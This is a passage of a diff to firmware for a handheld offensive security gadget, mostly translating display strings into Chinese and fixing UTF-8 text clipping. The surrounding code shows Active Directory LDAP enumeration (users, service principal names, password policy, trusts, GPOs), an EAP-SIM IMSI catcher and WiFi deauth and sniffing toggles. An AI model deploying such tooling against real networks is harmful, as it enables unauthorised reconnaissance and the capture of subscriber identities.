                  // 🔥 Ajoute ça : récupérer tout de suite le defaultNamingContext
                 if (getDefaultNamingContext(c)) {
                     ldapUiLogLine("[RootDSE] BaseDN = " + ldapDomainDN);
                     ldapUiUpdateContext(dcIP, ldapDomainDN);
                 } else {
-                    ldapUiLogLine("[WARN] RootDSE query failed — BaseDN unknown");
+                    ldapUiLogLine("[警告] RootDSE 查询失败 — BaseDN 未知");
                 }
                 reachable = true;
             } else {
-                ldapUiLogLine("[WARN] Simple bind failed (still continuing)");
+                ldapUiLogLine("[警告] 匿名绑定失败 (继续执行)");
             }
             c.stop();
         }
 
         if (!reachable) {
-            ldapUiLogLine("[ERROR] LDAP service not responding");
+            ldapUiLogLine("[错误] LDAP 服务无响应");
             Serial.println("[LDAP] No response from DC IP");
         }
 
@@ -32643,25 +32871,25 @@ bool detectAndBindToDC(IPAddress &dcIP)
         enterDebounce();
         M5.Display.clear();
         M5.Display.setCursor(5, 0);
-        M5.Display.setTextSize(1.5);
+        evilSetCnFont(M5.Display, 1.5);
         M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-        M5.Display.println("AD Login:");
-        String rawUser = getUserInput("AD Login:");
+        M5.Display.println("AD 用户名:");
+        String rawUser = getUserInput("AD 用户名:");
         ldapUsername = ldapNormalizeUsername(rawUser);
-        ldapUiLogLine("[AUTH] Login: " + ldapUsername);
+        ldapUiLogLine("[认证] 用户: " + ldapUsername);
         enterDebounce();
         M5.Display.clear();
         M5.Display.setCursor(5, 0);
-        M5.Display.setTextSize(1.5);
+        evilSetCnFont(M5.Display, 1.5);
         M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-        M5.Display.println("AD Password:");
-        ldapPassword = getUserInput("AD Password:");
+        M5.Display.println("AD 密码:");
+        ldapPassword = getUserInput("AD 密码:");
 
-        ldapUiLogLine("[AUTH] Trying authenticated bind...");
+        ldapUiLogLine("[认证] 正在尝试认证绑定...");
         WiFiClient cli;
         if (!cli.connect(dcIP, 389))
         {
-            ldapUiLogLine("[ERROR] TCP connect failed");
+            ldapUiLogLine("[错误] TCP 连接失败");
             return false;
         }
 
@@ -32672,11 +32900,11 @@ bool detectAndBindToDC(IPAddress &dcIP)
               ldapUiLogLine("[RootDSE] BaseDN = " + ldapDomainDN);
               ldapUiUpdateContext(dcIP, ldapDomainDN);
           } else {
-              ldapUiLogLine("[WARN] RootDSE query failed — BaseDN unknown");
+              ldapUiLogLine("[警告] RootDSE 查询失败 — BaseDN 未知");
           }
         }
         cli.stop();
-        ldapUiLogLine(ok ? "[AUTH] SUCCESS" : "[AUTH] FAILED");
+        ldapUiLogLine(ok ? "[认证] 成功" : "[认证] 失败");
         return ok;
     }
 
@@ -32691,13 +32919,13 @@ bool detectAndBindToDC(IPAddress &dcIP)
     uint8_t o1, o2, o3;
     sscanf(base_ip, "%hhu.%hhu.%hhu.", &o1, &o2, &o3);
 
-    ldapUiLogLine("[SCAN] Network: " + baseStr + "0-254");
+    ldapUiLogLine("[扫描] 网段: " + baseStr + "0-254");
     bool sameSubnet =
         ((local[0] & subnet[0]) == (o1 & subnet[0])) &&
         ((local[1] & subnet[1]) == (o2 & subnet[1])) &&
         ((local[2] & subnet[2]) == (o3 & subnet[2]));
 
-    ldapUiLogLine(String("[SCAN] Mode: ") + (sameSubnet ? "ARP" : "TCP"));
+    ldapUiLogLine(String("[扫描] 模式: ") + (sameSubnet ? "ARP" : "TCP"));
     Serial.println(sameSubnet ? "[SCAN] Same subnet → ARP" : "[SCAN] TCP fallback");
 
     if (sameSubnet)
@@ -32745,7 +32973,7 @@ bool detectAndBindToDC(IPAddress &dcIP)
 
     if (dcIP[0] == 0)
     {
-        ldapUiLogLine("[SCAN] No DC found.");
+        ldapUiLogLine("[扫描] 未发现域控.");
         return false;
     }
 
@@ -32753,32 +32981,32 @@ bool detectAndBindToDC(IPAddress &dcIP)
     enterDebounce();
     M5.Display.clear();
     M5.Display.setCursor(5, 0);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-    M5.Display.println("AD Login:");
-    String rawUser = getUserInput("AD Login:");
+    M5.Display.println("AD 用户名:");
+    String rawUser = getUserInput("AD 用户名:");
     ldapUsername = ldapNormalizeUsername(rawUser);
-    ldapUiLogLine("[AUTH] Login: " + ldapUsername);
+    ldapUiLogLine("[认证] 用户: " + ldapUsername);
 
 
     enterDebounce();
     M5.Display.clear();
     M5.Display.setCursor(5, 0);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-    M5.Display.println("AD Password:");
-    ldapPassword = getUserInput("AD Password:");
+    M5.Display.println("AD 密码:");
+    ldapPassword = getUserInput("AD 密码:");
 
     WiFiClient cli;
     if (!cli.connect(dcIP, 389))
     {
-        ldapUiLogLine("[ERROR] TCP connect failed during AUTH");
+        ldapUiLogLine("[错误] 认证时 TCP 连接失败");
         return false;
     }
 
     bool ok = ldapBind(cli, ldapUsername, ldapPassword);
     cli.stop();
-    ldapUiLogLine(ok ? "[AUTH] SUCCESS" : "[AUTH] FAILED");
+    ldapUiLogLine(ok ? "[认证] 成功" : "[认证] 失败");
     return ok;
 }
 
@@ -33011,16 +33239,16 @@ void ldapSearchPagedLoop(const IPAddress &dcIP,
                 tcpOk = true;
                 if (attempt > 1) {
                     Serial.printf("[LDAP] connect() succeeded after %d attempts\n", attempt);
-                    ldapUiLogLine("[INFO] Page " + String(page) +
-                                  ": TCP connect OK after " + String(attempt) + " attempts");
+                    ldapUiLogLine("[信息] 第 " + String(page) +
+                                  " 页: 重试 " + String(attempt) + " 次后 TCP 连接成功");
                 }
                 break;
             }
         
             Serial.printf("[LDAP] ERROR: connect() failed in search loop (attempt %d/%d)\n",
                           attempt, MAX_CONN_ATTEMPTS);
-            ldapUiLogLine("[ERROR] Page " + String(page) +
-                          ": TCP connect failed (attempt " + String(attempt) + "/" +
+            ldapUiLogLine("[错误] 第 " + String(page) +
+                          " 页: TCP 连接失败 (" + String(attempt) + "/" +
                           String(MAX_CONN_ATTEMPTS) + ")");
         
             delay(300); // petit cooldown entre tentatives
@@ -33028,8 +33256,8 @@ void ldapSearchPagedLoop(const IPAddress &dcIP,
         
         if (!tcpOk) {
             Serial.println("[LDAP] FATAL: giving up after TCP retries");
-            ldapUiLogLine("[FATAL] Page " + String(page) +
-                          ": TCP connect failed after retries");
+            ldapUiLogLine("[致命] 第 " + String(page) +
+                          " 页: 多次重试后 TCP 连接仍失败");
             cli.stop();
             break;  // on sort de la boucle de pages
         }
@@ -33040,16 +33268,16 @@ void ldapSearchPagedLoop(const IPAddress &dcIP,
                 bindOk = true;
                 if (attempt > 1) {
                     Serial.printf("[LDAP] AUTH bind succeeded after %d attempts\n", attempt);
-                    ldapUiLogLine("[INFO] Page " + String(page) +
-                                  ": AUTH bind OK after " + String(attempt) + " attempts");
+                    ldapUiLogLine("[信息] 第 " + String(page) +
+                                  " 页: 重试 " + String(attempt) + " 次后认证成功");
                 }
                 break;
             }
         
             Serial.printf("[LDAP] ERROR: AUTH bind failed in search loop (attempt %d/%d)\n",
                           attempt, MAX_BIND_ATTEMPTS);
-            ldapUiLogLine("[ERROR] Page " + String(page) +
-                          ": AUTH bind failed (attempt " + String(attempt) + "/" +
+            ldapUiLogLine("[错误] 第 " + String(page) +
+                          " 页: 认证绑定失败 (" + String(attempt) + "/" +
                           String(MAX_BIND_ATTEMPTS) + ")");
         
             delay(200);
@@ -33057,8 +33285,8 @@ void ldapSearchPagedLoop(const IPAddress &dcIP,
         
         if (!bindOk) {
             Serial.println("[LDAP] FATAL: giving up after AUTH bind retries");
-            ldapUiLogLine("[FATAL] Page " + String(page) +
-                          ": AUTH bind failed after retries");
+            ldapUiLogLine("[致命] 第 " + String(page) +
+                          " 页: 多次重试后认证仍失败");
             cli.stop();
             break;  // on sort de la boucle de pages
         }
@@ -33144,7 +33372,7 @@ void ldapSearchPagedLoop(const IPAddress &dcIP,
         // ----------------------------------------------------------------
         int entriesThisPage = parseLDAPSearchResponse(ldapRespBuf, respLen, attrs, outFile);
         totalEntries += entriesThisPage;
-        ldapUiLogLine("[PAGE] " + String(page) + ": " + String(totalEntries) + " entries");
+        ldapUiLogLine("[分页] 第 " + String(page) + " 页: 共 " + String(totalEntries) + " 条记录");
 
         Serial.printf("[LDAP] Page %d: %d entries parsed (total so far: %d)\n", page, entriesThisPage, totalEntries);
 
@@ -33628,7 +33856,7 @@ void ldapExtractAndSave(
     // --------------------------------------------------------------------
     if (baseDN.length() < 3){
         Serial.println("[LDAP] ERROR: BaseDN invalid.");
-        ldapUiLogLine("[ERROR] BaseDN invalid, aborting extract.");
+        ldapUiLogLine("[错误] BaseDN 无效, 中止导出.");
         return;
     }
 
@@ -33644,7 +33872,7 @@ void ldapExtractAndSave(
     File fil = SD.open(fullPath, FILE_WRITE);
     if (!fil){
         Serial.println("[LDAP] ERROR: Cannot open file: " + fullPath);
-        ldapUiLogLine(String("[ERROR] Cannot open file: ") + fullPath);
+        ldapUiLogLine(String("[错误] 无法打开文件: ") + fullPath);
         return;
     }
     Serial.println("[LDAP] File opened → " + fullPath);
@@ -33670,9 +33898,9 @@ void ldapExtractAndSave(
     // Boucle de recherche paginée AUTH
     // --------------------------------------------------------------------
     Serial.println("[LDAP] Starting paged search loop...");
-    ldapUiLogLine("[LDAP] Paged search started...");
+    ldapUiLogLine("[LDAP] 开始分页搜索...");
     ldapSearchPagedLoop(dcIP, baseDN, filter, attributes, fil);
-    ldapUiLogLine("[LDAP] Paged search finished.");
+    ldapUiLogLine("[LDAP] 分页搜索完成.");
 
     // --------------------------------------------------------------------
     // FINALIZE
@@ -33692,15 +33920,15 @@ void ldapExtractAndSave(
 // ─────────────────────────────────────────────
 void runLDAPDomainDump() {
     ldapRespBuf = (uint8_t*)malloc(LDAP_BUF_SIZE);
-    if (!ldapRespBuf) { waitAndReturnToMenu("LDAP alloc failed"); return; }
+    if (!ldapRespBuf) { waitAndReturnToMenu("LDAP 内存分配失败"); return; }
 
     IPAddress dcIP;
 
     // 1) Détection + Bind (fonction existante)
     if (!detectAndBindToDC(dcIP)) {
-        ldapUiLogLine("[ERROR] DetectAndBindToDC() failed.");
+        ldapUiLogLine("[错误] 域控探测与绑定失败.");
         free(ldapRespBuf); ldapRespBuf = nullptr;
-        waitAndReturnToMenu("LDAP Bind failed");
+        waitAndReturnToMenu("LDAP 绑定失败");
         return;
     }
 
@@ -33711,16 +33939,16 @@ void runLDAPDomainDump() {
 
     // 3) Initialisation de la console LDAP UI pour la phase DUMP
     ldapUiResetLog(dcIP, ldapDomainDN);
-    ldapUiSetPhase("DUMP");
+    ldapUiSetPhase("导出");
 
-    ldapUiLogLine("[SCAN] DC: " + dcIP.toString());
+    ldapUiLogLine("[扫描] 域控: " + dcIP.toString());
     ldapUiLogLine("[LDAP] BaseDN: " + ldapDomainDN);
     if (ldapUsername.length() > 0) {
-        ldapUiLogLine("[AUTH] User: " + ldapUsername);
+        ldapUiLogLine("[认证] 用户: " + ldapUsername);
     } else {
-        ldapUiLogLine("[AUTH] Anonymous bind");
+        ldapUiLogLine("[认证] 匿名绑定");
     }
-    ldapUiLogLine("[LDAP] Starting full domain dump...");
+    ldapUiLogLine("[LDAP] 开始全量域信息导出...");
 
     Serial.println();
     Serial.println("────────────────────────────────────────────");
@@ -33734,15 +33962,15 @@ void runLDAPDomainDump() {
     // ─────────────────────────────────────
     // DOMAIN USERS
     // ─────────────────────────────────────
-    ldapUiLogLine("[LDAP] Dumping domain users...");
-    ldapUiSetPhase("DUMP USERS");
+    ldapUiLogLine("[LDAP] 正在导出域用户...");
+    ldapUiSetPhase("导出用户");
 
     ldapExtractAndSave(
         dcIP,
         ldapDomainDN,
         "objectCategory=person",
         "domain_users.html",
-        "Domain Users",
+        "域用户 (Domain Users)",
         {
             "cn",                    // CN
             "name",                  // name (RDN)
@@ -33758,19 +33986,19 @@ void runLDAPDomainDump() {
             "servicePrincipalName"   // SPN
         }
     );
-    ldapUiLogLine("[LDAP] Done: Domain Users");
+    ldapUiLogLine("[LDAP] 完成: 域用户");
 
     // ─────────────────────────────────────
     // DOMAIN GROUPS
     // ─────────────────────────────────────
-    ldapUiSetPhase("DUMP Groups");
-    ldapUiLogLine("[LDAP] Dumping domain groups...");
+    ldapUiSetPhase("导出组");
+    ldapUiLogLine("[LDAP] 正在导出域组...");
     ldapExtractAndSave(
         dcIP,
         ldapDomainDN,
         "objectCategory=group",
         "domain_groups.html",
-        "Domain Groups",
+        "域组 (Domain Groups)",
         {
             "cn",                    // CN
             "sAMAccountName",        // SAM Name
@@ -33781,19 +34009,19 @@ void runLDAPDomainDump() {
             "whenChanged"            // Changed on
         }
     );
-    ldapUiLogLine("[LDAP] Done: Domain Groups");
+    ldapUiLogLine("[LDAP] 完成: 域组");
 
     // ─────────────────────────────────────
     // DOMAIN COMPUTER ACCOUNTS
     // ─────────────────────────────────────
-    ldapUiLogLine("[LDAP] Dumping domain computers...");
-    ldapUiSetPhase("DUMP Computers");
+    ldapUiLogLine("[LDAP] 正在导出域计算机...");
+    ldapUiSetPhase("导出计算机");
     ldapExtractAndSave(
         dcIP,
         ldapDomainDN,
         "objectCategory=computer",
         "domain_computers.html",
-        "Domain Computer Accounts",
+        "域计算机账户 (Domain Computers)",
         {
             "cn",                         // CN
             "sAMAccountName",             // SAM Name
@@ -33807,19 +34035,19 @@ void runLDAPDomainDump() {
             "description"                 // description
         }
     );
-    ldapUiLogLine("[LDAP] Done: Domain Computers");
+    ldapUiLogLine("[LDAP] 完成: 域计算机");
 
     // ─────────────────────────────────────
     // DOMAIN POLICY (password / lockout)
     // ─────────────────────────────────────
-    ldapUiLogLine("[LDAP] Dumping domain policy...");
-    ldapUiSetPhase("DUMP Policy");
+    ldapUiLogLine("[LDAP] 正在导出域策略...");
+    ldapUiSetPhase("导出策略");
     ldapExtractAndSave(
         dcIP,
         ldapDomainDN,
         "objectClass=domain",
         "domain_policy.html",
-        "Domain Policy",
+        "域策略 (Domain Policy)",
         {
             "distinguishedName",          // distinguishedName
             "lockoutObservationWindow",   // Lockout time window
@@ -33833,35 +34061,35 @@ void runLDAPDomainDump() {
             "ms-DS-MachineAccountQuota"   // Machine Account Quota
         }
     );
-    ldapUiLogLine("[LDAP] Done: Domain Policy");
+    ldapUiLogLine("[LDAP] 完成: 域策略");
 
     // ─────────────────────────────────────
     // TRUSTS
     // ─────────────────────────────────────
-    ldapUiLogLine("[LDAP] Dumping domain trusts...");
-    ldapUiSetPhase("DUMP Trusts");
+    ldapUiLogLine("[LDAP] 正在导出域信任关系...");
+    ldapUiSetPhase("导出信任");
     ldapExtractAndSave(
         dcIP,
         ldapDomainDN,
         "objectClass=trustedDomain",
         "domain_trusts.html",
-        "Domain Trusts",
+        "域信任关系 (Domain Trusts)",
         {
             "trustPartner",
             "trustDirection",
             "trustType"
         }
     );
-    ldapUiLogLine("[LDAP] Done: Domain Trusts");
-    ldapUiSetPhase("DUMP GPO");
-    ldapUiLogLine("[LDAP] Dumping GPOs...");
+    ldapUiLogLine("[LDAP] 完成: 域信任关系");
+    ldapUiSetPhase("导出 GPO");
+    ldapUiLogLine("[LDAP] 正在导出组策略 GPO...");
     
     ldapExtractAndSave(
         dcIP,
         ldapDomainDN,
         "objectClass=groupPolicyContainer",
         "domain_gpo.html",
-        "Group Policy Objects",
+        "组策略对象 (GPO)",
         {
             "displayName",
             "name",
@@ -33875,13 +34103,13 @@ void runLDAPDomainDump() {
         }
     );
     
-    ldapUiLogLine("[LDAP] Done: GPOs");
+    ldapUiLogLine("[LDAP] 完成: 组策略 GPO");
     // ─────────────────────────────────────
     // Fin – recap & viewer
     // ─────────────────────────────────────
-    ldapUiSetPhase("DONE");
-    ldapUiLogLine("[LDAP] Dump completed.");
-    ldapUiLogLine(String("[LDAP] Files in /evil/LDAP/") + ldapDomainNetbios + "/");
+    ldapUiSetPhase("完成");
+    ldapUiLogLine("[LDAP] 导出全部完成.");
+    ldapUiLogLine(String("[LDAP] 文件保存在 /evil/LDAP/") + ldapDomainNetbios + "/");
     ldapUiLogLine(" - domain_users.html");
     ldapUiLogLine(" - domain_groups.html");
     ldapUiLogLine(" - domain_computers.html");
@@ -33893,7 +34121,7 @@ void runLDAPDomainDump() {
     ldapUiShowViewer();
 
     free(ldapRespBuf); ldapRespBuf = nullptr;
-    waitAndReturnToMenu("LDAP Dump done");
+    waitAndReturnToMenu("LDAP 导出完成");
 }
 
 
@@ -34159,11 +34387,11 @@ void eapMon_drawHeader() {
   d.fillRect(0, 0, 240, 12, taskbarBackgroundColor);
   d.fillRect(0, 12, 240, 1, taskbarDividerColor);
 
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(taskbarTextColor, taskbarBackgroundColor);
 
   d.setCursor(2, 2);
-  d.print("EAP-SIM IMSI Catcher");
+  d.print("EAP-SIM IMSI 捕获器");
 }
 
 
@@ -34178,22 +34406,22 @@ void eapMon_drawCards() {
 
   // Unique
   d.drawRect(2, y0, 116, h, menuSelectedBackgroundColor);
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
   d.setCursor(8, y0 + 6);
-  d.print("UNIQUE IMSI");
-  d.setTextSize(2);
+  d.print("去重 IMSI");
+  evilSetCnFont(d, 2);
   d.setTextColor(menuTextFocusedColor, TFT_BLACK);
   d.setCursor(8, y0 + 20);
   d.print((int)eapMon_count);
 
   // Total
   d.drawRect(122, y0, 116, h, menuSelectedBackgroundColor);
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
   d.setCursor(128, y0 + 6);
-  d.print("TOTAL IMSI");
-  d.setTextSize(2);
+  d.print("总计 IMSI");
+  evilSetCnFont(d, 2);
   d.setTextColor(menuTextFocusedColor, TFT_BLACK);
   d.setCursor(128, y0 + 20);
   d.print((unsigned long)eapMon_totalEap);
@@ -34209,14 +34437,14 @@ void eapMon_drawStatusBar() {
   d.fillRect(0, Y, 240, H, TFT_BLACK);
   d.drawFastHLine(0, Y, 240, TFT_DARKGREY);
 
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(TFT_DARKGREY, TFT_BLACK);
   d.setCursor(2, Y + 2);
-  d.print("Status:");
+  d.print("状态:");
 
   char buf[32];
-  if (eapMon_autoChannel) snprintf(buf, sizeof(buf), "CH:%d AUTO", eapMon_channel);
-  else                   snprintf(buf, sizeof(buf), "CH:%d",      eapMon_channel);
+  if (eapMon_autoChannel) snprintf(buf, sizeof(buf), "信道:%d 自动", eapMon_channel);
+  else                   snprintf(buf, sizeof(buf), "信道:%d",      eapMon_channel);
 
   d.setTextColor(menuTextFocusedColor, TFT_BLACK);
   int tw = d.textWidth(buf);
@@ -34233,14 +34461,14 @@ void eapMon_drawLastSeen() {
   const int H = 18;
 
   d.fillRect(0, Y, 240, H, TFT_BLACK);
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
   d.setTextColor(TFT_DARKGREY, TFT_BLACK);
   d.setCursor(2, Y + 2);
-  d.print("Last:");
+  d.print("最近:");
 
   if (eapMon_count == 0) {
     d.setCursor(40, Y + 2);
-    d.print("waiting...");
+    d.print("等待中...");
     return;
   }
 
@@ -34263,7 +34491,7 @@ void eapMon_drawList() {
   const int H = 44;
 
   d.fillRect(0, Y, 240, H, TFT_BLACK);
-  d.setTextSize(1);
+  evilSetCnFont(d, 1);
 
   int y = Y + 1;
 
@@ -34514,7 +34742,7 @@ void imsiCatcher() {
   esp_wifi_stop();
 
   Serial.println("[EAPMON] stopped.");
-  waitAndReturnToMenu("IMSI Catcher Stopped");
+  waitAndReturnToMenu("IMSI 捕获器已停止");
 }
 
 
@@ -34614,29 +34842,31 @@ static bool ow_sprReady = false;
 void ow_printClippedSSID_px(const String &s, int maxPixelW) {
   if (maxPixelW <= 0) return;
 
-  // For default font, textSize 1.5 => ~9px per char (approx).
-  const int approxCharW = 9;
-  int maxChars = maxPixelW / approxCharW;
-
-  if (maxChars <= 0) return;
-  if (maxChars > 32) maxChars = 32;
-
-  const char* p = s.c_str();
-  int len = 0;
-  while (p[len] != '\0') len++;
-
-  if (len <= maxChars) {
+  if (M5.Display.textWidth(s) <= maxPixelW) {
     M5.Display.print(s);
     return;
   }
 
-  if (maxChars == 1) {
+  int dotW = M5.Display.textWidth(".");
+  if (maxPixelW <= dotW) {
     M5.Display.print(".");
     return;
   }
 
-  for (int i = 0; i < maxChars - 1; i++) {
-    M5.Display.print(p[i]);
+  const char* p = s.c_str();
+  int len = s.length();
+  int cut = len;
+  while (cut > 0) {
+    do {
+      cut--;
+    } while (cut > 0 && ((uint8_t)p[cut] & 0xC0) == 0x80);
+
+    String sub = s.substring(0, cut);
+    if (M5.Display.textWidth(sub) + dotW <= maxPixelW) {
+      M5.Display.print(sub);
+      M5.Display.print(".");
+      return;
+    }
   }
   M5.Display.print(".");
 }
@@ -34645,26 +34875,32 @@ void ow_printClippedSSID_px(const String &s, int maxPixelW) {
 void ow_printClippedSSID_px_canvas(M5Canvas &c, const String &s, int maxPixelW) {
   if (maxPixelW <= 0) return;
 
-  const int approxCharW = 9;
-  int maxChars = maxPixelW / approxCharW;
-  if (maxChars <= 0) return;
-  if (maxChars > 32) maxChars = 32;
-
-  const char* p = s.c_str();
-  int len = 0;
-  while (p[len] != '\0') len++;
-
-  if (len <= maxChars) {
+  if (c.textWidth(s) <= maxPixelW) {
     c.print(s);
     return;
   }
 
-  if (maxChars == 1) {
+  int dotW = c.textWidth(".");
+  if (maxPixelW <= dotW) {
     c.print(".");
     return;
   }
 
-  for (int i = 0; i < maxChars - 1; i++) c.print(p[i]);
+  const char* p = s.c_str();
+  int len = s.length();
+  int cut = len;
+  while (cut > 0) {
+    do {
+      cut--;
+    } while (cut > 0 && ((uint8_t)p[cut] & 0xC0) == 0x80);
+
+    String sub = s.substring(0, cut);
+    if (c.textWidth(sub) + dotW <= maxPixelW) {
+      c.print(sub);
+      c.print(".");
+      return;
+    }
+  }
   c.print(".");
 }
 
@@ -34682,7 +34918,9 @@ void ow_printClippedSSID(const String &s) {
     return;
   }
 
-  for (int i = 0; i < maxChars - 1; i++) {
+  int cut = maxChars - 1;
+  while (cut > 0 && ((uint8_t)p[cut] & 0xC0) == 0x80) cut--;
+  for (int i = 0; i < cut; i++) {
     M5.Display.print(p[i]);
   }
   M5.Display.print(".");
@@ -34929,10 +35167,10 @@ void ow_drawFrame() {
   M5.Display.fillRect(0, 0, OW_LIST_W, OW_TASKBAR_H, taskbarBackgroundColor);
   M5.Display.fillRect(0, OW_TASKBAR_H, OW_LIST_W, 2, taskbarDividerColor);
 
-  M5.Display.setTextSize(1.0);
+  evilSetCnFont(M5.Display, 1.0);
   M5.Display.setTextColor(taskbarTextColor, taskbarBackgroundColor);
   M5.Display.setCursor(5, 3);
-  M5.Display.print("Open WiFi Finder");
+  M5.Display.print("开放 WiFi 探测");
 
 }
 
@@ -34979,31 +35217,31 @@ void ow_drawStatsPanel() {
   // ---- Text layout: label + value, centered-ish ----
   // small helper for consistent placements
   auto drawLabelValue = [&](int yBox, int hBox, const char* label, int value, uint16_t colorValue) {
-    ow_panelSpr.setTextSize(1.0);
+    evilSetCnFont(ow_panelSpr, 1.0);
     ow_panelSpr.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     ow_panelSpr.setCursor(6, yBox + 4);
     ow_panelSpr.print(label);
 
-    ow_panelSpr.setTextSize(1.5);
+    evilSetCnFont(ow_panelSpr, 1.5);
     ow_panelSpr.setTextColor(colorValue, menuBackgroundColor);
     ow_panelSpr.setCursor(6, yBox + (hBox / 2) - 2); // visually centered
     ow_panelSpr.print(value);
   };
 
-  drawLabelValue(ySeen, hSeen, "Seen",  ow_lastTotalSeen, menuTextUnFocusedColor);
-  drawLabelValue(yOpen, hOpen, "Open",  ow_lastOpenSeen,  menuTextUnFocusedColor);
-  drawLabelValue(yNet,  hNet,  "NetOK", netOK,           menuTextFocusedColor);
+  drawLabelValue(ySeen, hSeen, "总数",  ow_lastTotalSeen, menuTextUnFocusedColor);
+  drawLabelValue(yOpen, hOpen, "开放",  ow_lastOpenSeen,  menuTextUnFocusedColor);
+  drawLabelValue(yNet,  hNet,  "联网", netOK,           menuTextFocusedColor);
 
   // ---- Beep box: label + ON/OFF ----
-  ow_panelSpr.setTextSize(1.0);
+  evilSetCnFont(ow_panelSpr, 1.0);
   ow_panelSpr.setCursor(6, yBeep + 4);
   ow_panelSpr.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-  ow_panelSpr.print("Beep");
+  ow_panelSpr.print("提示音");
 
-  ow_panelSpr.setTextSize(1.5);
+  evilSetCnFont(ow_panelSpr, 1.5);
   ow_panelSpr.setCursor(6, yBeep + (hBeep / 2) - 2);
   ow_panelSpr.setTextColor(ow_beepEnabled ? TFT_GREEN : TFT_RED, menuBackgroundColor);
-  ow_panelSpr.print(ow_beepEnabled ? "ON" : "OFF");
+  ow_panelSpr.print(ow_beepEnabled ? "开" : "关");
 
   ow_panelSpr.pushSprite(OW_PANEL_X, 0);
 }
@@ -35036,7 +35274,7 @@ void ow_drawWifiList() {
   int y = 2; // inside sprite
   int used[OW_MAX_WIFI] = {0};
 
-  ow_listSpr.setTextSize(1.5);
+  evilSetCnFont(ow_listSpr, 1.5);
 
   const int ssidLeftX    = 2;   // no marker space (back to original look)
   const int rssiRightPad = 2;
@@ -35181,7 +35419,7 @@ void openWifiDashboardLoop() {
 
       ow_uiFreeSprites();
 
-      waitAndReturnToMenu("Back to Menu");
+      waitAndReturnToMenu("返回主菜单");
       return;
     }
 
@@ -35501,16 +35739,16 @@ void c5_poll_uart() {
 // ===================== UI helpers =====================
 void c5_uiHeader(const char* subtitle) {
   M5.Display.fillScreen(menuBackgroundColor);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(0, 0);
   M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-  M5.Display.println("ESP32C5 Serial");
+  M5.Display.println("ESP32C5 串口工具");
   M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-  M5.Display.printf("UART:%lu  Band:%s\n", (unsigned long)C5_BAUD, g_c5_band);
-  M5.Display.printf("Deauth:%s Ward:%s Sniff:%s\n",
-                    g_c5_deauth_on ? "ON" : "OFF",
-                    g_c5_ward_on ? "ON" : "OFF",
-                    g_c5_sniff_on ? "ON" : "OFF");
+  M5.Display.printf("波特率:%lu  频段:%s\n", (unsigned long)C5_BAUD, g_c5_band);
+  M5.Display.printf("泛洪:%s 巡航:%s 嗅探:%s\n",
+                    g_c5_deauth_on ? "开" : "关",
+                    g_c5_ward_on ? "开" : "关",
+                    g_c5_sniff_on ? "开" : "关");
   M5.Display.printf("AP:%u\n", (unsigned)g_c5_ap_count);
 
   if (subtitle && subtitle[0]) {
@@ -35520,7 +35758,7 @@ void c5_uiHeader(const char* subtitle) {
 }
 
 void c5_uiFooter(const char* hint) {
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
   M5.Display.setCursor(0, M5.Display.height() - 10);
   M5.Display.print(hint);
@@ -35598,10 +35836,10 @@ int c5_chooseBandMenu() {
 
     if (need) {
       M5.Display.clear();
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       M5.Display.setCursor(0, 0);
       M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-      M5.Display.println("ESP32C5 - BAND");
+      M5.Display.println("ESP32C5 - 选择频段");
       M5.Display.println("----------------");
 
       for (int i = 0; i < n; ++i) {
@@ -35615,7 +35853,7 @@ int c5_chooseBandMenu() {
         M5.Display.println(items[i]);
       }
 
-      c5_uiFooter("^/v ;/.  ENTER  BACKSPACE");
+      c5_uiFooter(";/.:上下  回车:确认  退格:返回");
       need = false;
     }
 
@@ -35642,7 +35880,7 @@ bool c5_runScriptListCommand(const char* cmdLine) {
   c5_uartFlushInput();
 
   c5_uiHeader(cmdLine);
-  c5_uiFooter("Running... BACKSPACE cancel");
+  c5_uiFooter("执行中... 按退格取消");
   c5_sendScriptLine(cmdLine);
 
   const uint32_t t0 = millis();
@@ -35664,8 +35902,8 @@ bool c5_runScriptListCommand(const char* cmdLine) {
       c5_uiHeader(cmdLine);
       M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
       M5.Display.printf("AP:%u\n", (unsigned)g_c5_ap_count);
-      M5.Display.println(g_c5_seenHeader ? "Parsing: OK" : "Parsing: ...");
-      c5_uiFooter("Wait end... BACKSPACE");
+      M5.Display.println(g_c5_seenHeader ? "解析: 正常" : "解析: 等待中...");
+      c5_uiFooter("等待完成... 按退格取消");
     }
 
     if (g_c5_ap_count > 0 && g_c5_lastUsefulRx > 0) {
@@ -35677,10 +35915,10 @@ bool c5_runScriptListCommand(const char* cmdLine) {
 
   g_c5_cap = C5CAP_NONE;
 
-  c5_uiHeader("DONE");
+  c5_uiHeader("完成");
   M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-  M5.Display.printf("AP received: %u\n", (unsigned)g_c5_ap_count);
-  c5_uiFooter("ENTER: view list  BACKSPACE: menu");
+  M5.Display.printf("已接收 AP: %u\n", (unsigned)g_c5_ap_count);
+  c5_uiFooter("回车:查看列表  退格:返回菜单");
 
   while (true) {
     M5.update();
@@ -35705,10 +35943,10 @@ void c5_viewApListAndSelectTarget() {
       M5.Display.clear();
 
       // En-tête simplifié et fin
